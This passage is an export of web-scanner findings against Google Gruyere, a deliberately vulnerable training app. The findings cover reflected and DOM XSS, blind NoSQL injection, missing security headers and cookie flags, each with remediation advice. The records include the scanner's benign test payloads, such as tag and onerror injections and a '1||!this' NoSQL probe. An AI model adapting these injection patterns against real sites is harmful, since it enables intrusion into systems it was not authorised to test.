_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"102140eb-0db6-4fa0-a0f2-8bd62325bb6f",2022-03-15T21:06:17.432Z,2022-03-15T13:38:31Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/feed.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"102792bf-c24f-4161-b18e-ec59f7bcc7be",2022-03-15T21:06:17.432Z,2022-03-15T13:37:38Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"116fe362-0967-4d1b-b1f3-866eadbe151d",2022-03-15T18:42:41.743Z,2022-03-15T16:48:46Z,"A response has been received with a response code '400' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"This is an informational notice that the scanner identified a potential login form that could be used by the scanner to authenticate and have access to additional pages for extending its coverage.","Authentication & Session",98033,"Login Form Detected",,2018-02-08T00:00:00Z,2018-02-08T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,"Edit scan policy and add login form authentication credentials to allow scanner to authenticate to the web application.",,"12c1b5a5-5616-4c2f-83d1-8f560305b499",2022-03-15T18:42:41.743Z,2022-03-15T16:50:16Z,"Potential login form has been identified in URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login' with following fields:
- uid (TEXT)
- pw (PASSWORD)
To perform authenticated scan, configure your scan and add 'Login Form' authentication, with the URL associated to this plugin and as login parameters values for the above non-hidden fields.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into an HTML event attribute. For example `<div onmouseover=""x=INJECTION_HERE""</div>`, where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98108,"Cross-Site Scripting (XSS) in event tag of HTML element",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"1440a7e1-3322-458a-8c7c-04e51cf58022",2022-03-15T21:06:17.432Z,2022-03-15T13:35:04Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 |  script:;tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | _refreshsnippets(""361357029172560933265350706939995878846"", ""cheddar script:;tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//"")

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert content directly into an HTML tag. For example `<INJECTION_HERE href=.......etc>` where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98105,"Cross-Site Scripting (XSS) in HTML tag",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"153343f3-9647-4f9c-b450-74198bd34fd1",2022-03-15T21:06:17.432Z,2022-03-15T14:59:52Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The remote host contains a file named 'robots.txt' that is intended to prevent web 'robots' from visiting certain directories in a website for maintenance or indexing purposes. A malicious user may also be able to use the contents of this file to learn of sensitive documents or directories on the affected site and either retrieve them directly or target them for other attacks.","Web Servers",98705,"Robots.txt File Detected",,2019-09-19T00:00:00Z,2020-12-17T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.robotstxt.org",Info,"Review the contents of the site's robots.txt file, use Robots META tags instead of entries in the robots.txt file, and/or adjust the web server's access controls to limit access to sensitive material.",,"1620e57c-bbfb-407f-bf6b-f33b1dea926a",2022-03-15T18:42:41.743Z,2022-03-15T16:44:06Z,"A robots.txt file was detected at http://google-gruyere.appspot.com/robots.txt containing the following entries.
http://google-gruyere.appspot.com/0
http://google-gruyere.appspot.com/1
http://google-gruyere.appspot.com/2
http://google-gruyere.appspot.com/3
http://google-gruyere.appspot.com/4
http://google-gruyere.appspot.com/5
http://google-gruyere.appspot.com/6
http://google-gruyere.appspot.com/7
http://google-gruyere.appspot.com/8
http://google-gruyere.appspot.com/9
http://google-gruyere.appspot.com/start
http://google-gruyere.appspot.com/resetbutton
",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","SameSite is an attribute which can be set on a cookie to instruct the web browser if this cookie can be sent along with cross-site requests to help prevent Cross-Site Request Forgery (CSRF) attacks.

The attribute has three possible values :

 - Strict : the cookie will only be sent in a first-party context, thus preventing cross-site requests initiated from third-party websites to include it.

 - Lax : the cookie is allowed to be sent in GET cross-site requests initiated by the top-level navigation from third-party websites. For example, following an hypertext link from the external website will make the request include the cookie.

 - None : the cookie is explicitly set to be sent by the browser in any context.

The scanner identified the lack of SameSite attribute on cookies set by the application or a misconfiguration.","Web Applications",115540,"Cookie Without SameSite Flag Detected",,2018-12-14T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A5], owasp_2013=[A8], owasp_2017=[], owasp_2021=[A1], cwe=[352], cve=[], cpe=[], wasc=[Cross-Site Request Forgery], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite, https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute, https://web.dev/samesite-cookies-explained, https://blog.chromium.org/2019/10/developers-get-ready-for-new.html",Low,"Web browsers default behavior may differ when processing cookies in a cross-site context, making the final decision to send the cookie in this context unpredictable. The SameSite attribute should be set in every cookie to enforce the expected result by developers. When using the 'None' attribute value, ensure that the cookie is also set with the 'Secure' flag.",,"163329d2-ee11-4107-a7a3-abf6a1ffe6b7",2022-03-15T21:06:17.432Z,2022-03-15T13:51:13Z,"The scanner detected a cookie named 'GRUYERE' which does not have the 'SameSite' attribute set.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:N/I:P/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N","Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.

The server didn't return an `X-Frame-Options` header which means that this website could be at risk of a clickjacking attack.

The `X-Frame-Options` HTTP response header can be used to indicate whether or not a browser should be allowed to render a page inside a frame or iframe. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.","HTTP Security Header",98060,"Missing 'X-Frame-Options' Header",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A4, A7], cwe=[346, 1021], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options, http://tools.ietf.org/html/rfc7034, https://www.owasp.org/index.php/Clickjacking",Low,"Configure your web server to include an `X-Frame-Options` header.",,"16901d98-f26c-4af5-b5a3-ff7b6b93f091",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"Page http://google-gruyere.appspot.com/361357029172560933265350706939995878846/ has no X-Frame-Option header defined",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"16a1ee68-eb43-4d46-b37a-d2003abf4425",2022-03-15T21:06:17.432Z,2022-03-15T16:16:51Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/%20ADw-%20AD4-' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Screenshot of the target web page, see attached image. This screenshot should show you the target page we are launching the scan against. If the image is not of the intended target page, please check the provided url in the scan configuration.",General,98138,Screenshot,,2018-01-23T00:00:00Z,2018-02-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"17e736d3-5cf3-4f2c-9337-1d56021d6312",2022-03-15T18:42:41.743Z,2022-03-15T16:42:38Z,"WAS Scanner has taken a screenshot of the page at url 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/' with dimensions 1600x1200.

Please see the attachment for the screenshot image.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"1887cd48-2d70-4edd-ae6d-87095db0d33a",2022-03-15T18:42:41.743Z,2022-03-15T17:59:55Z,"On http://google-gruyere.appspot.com/part1 debug error messages were detected. Please see the attached response for full details.
<b>WARNING:</b> Because Gruyere is very vulnerable",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"19e7fbc2-799f-4bcc-9b14-c6b79a38fc09",2022-03-15T21:06:17.432Z,2022-03-15T14:56:08Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","SameSite is an attribute which can be set on a cookie to instruct the web browser if this cookie can be sent along with cross-site requests to help prevent Cross-Site Request Forgery (CSRF) attacks.

The attribute has three possible values :

 - Strict : the cookie will only be sent in a first-party context, thus preventing cross-site requests initiated from third-party websites to include it.

 - Lax : the cookie is allowed to be sent in GET cross-site requests initiated by the top-level navigation from third-party websites. For example, following an hypertext link from the external website will make the request include the cookie.

 - None : the cookie is explicitly set to be sent by the browser in any context.

The scanner identified the lack of SameSite attribute on cookies set by the application or a misconfiguration.","Web Applications",115540,"Cookie Without SameSite Flag Detected",,2018-12-14T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A5], owasp_2013=[A8], owasp_2017=[], owasp_2021=[A1], cwe=[352], cve=[], cpe=[], wasc=[Cross-Site Request Forgery], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite, https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute, https://web.dev/samesite-cookies-explained, https://blog.chromium.org/2019/10/developers-get-ready-for-new.html",Low,"Web browsers default behavior may differ when processing cookies in a cross-site context, making the final decision to send the cookie in this context unpredictable. The SameSite attribute should be set in every cookie to enforce the expected result by developers. When using the 'None' attribute value, ensure that the cookie is also set with the 'Secure' flag.",,"1b0d7ced-42f1-4afb-9293-4323481564a7",2022-03-15T18:42:41.743Z,2022-03-15T16:59:28Z,"The scanner detected a cookie named 'GRUYERE' which does not have the 'SameSite' attribute set.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"There are a number of HTTP methods that can be used on a webserver (`OPTIONS`, `HEAD`, `GET`, `POST`, `PUT`, `DELETE` etc.). Each of these methods perform a different function and each have an associated level of risk when their use is permitted on the webserver.

By sending an HTTP OPTIONS request and a direct HTTP request for each method, the scanner discovered the methods that are allowed by the server.","Web Applications",98047,"Allowed HTTP Methods",,2017-03-31T00:00:00Z,2021-07-13T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://httpd.apache.org/docs/2.2/mod/core.html#limitexcept",Info,"It is recommended that a whitelisting approach be taken to explicitly permit only the HTTP methods required by the application and block all others.",,"1b712dd4-cbb4-44ea-ad00-30f5f8762a92",2022-03-15T18:42:41.743Z,2022-03-15T16:42:42Z,"The scanner was able to identify several HTTP methods that can be used for one or several URLs. The results are available as attachments.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"1e34d1e0-d1cf-4dcb-aa73-92b4c8b99f8e",2022-03-15T21:06:17.432Z,2022-03-15T17:51:43Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/563265819128830739647592760263700851280/newaccount.gtl with input fields : 
- action (hidden)
- uid (text)
- pw (password)
- is_author (hidden)

This form is submitted by using the following action : https://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"210f9660-b3cf-4167-96d1-2626175ad396",2022-03-15T18:42:41.743Z,2022-03-15T16:49:31Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login with input fields : 
- uid (text)
- pw (password)

This form is submitted by using the following action : http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",7.5,"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P",7.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L","A NoSQL injection occurs when a value originating from the client's request is used within a NoSQL call without prior sanitisation.

This can allow cyber-criminals to execute arbitrary NoSQL code and thus steal data, or use the additional functionality of the database server to take control of further server components.

Scanner discovered that the affected page and parameter are vulnerable. This injection was detected as scanner was able to inject specific NoSQL queries that if vulnerable result in the responses for each injection being different. This is known as a blind NoSQL injection vulnerability.",Injection,98119,"Blind NoSQL Injection (differential analysis)",,2017-03-31T00:00:00Z,2022-05-25T00:00:00Z,"owasp_api_2019=[API8], owasp_2010=[A1], owasp_2013=[A1], owasp_2017=[A1], owasp_2021=[A3], cwe=[89], cve=[], cpe=[], wasc=[SQL Injection], bid=[]","https://www.owasp.org/index.php/Testing_for_NoSQL_injection",High,"The most effective remediation against NoSQL injection attacks is to ensure that NoSQL API calls are not constructed via string concatenation that includes unsanitized data.
Sanitization is best achieved using existing escaping libraries.",,"22b3de1a-4b49-4c0d-a861-b5ef0aa3b0ea",2022-03-15T21:06:17.432Z,2022-03-15T18:34:33Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile' by exploiting 'link' element named 'uid' and injecting following payload:

 | 1||!this

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | 1||this for TRUE statement and 1||!this for FALSE statement

The information used to check the vulnerability have been provided in attachment.",NONE,High,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into an HTML event attribute. For example `<div onmouseover=""x=INJECTION_HERE""</div>`, where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98108,"Cross-Site Scripting (XSS) in event tag of HTML element",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
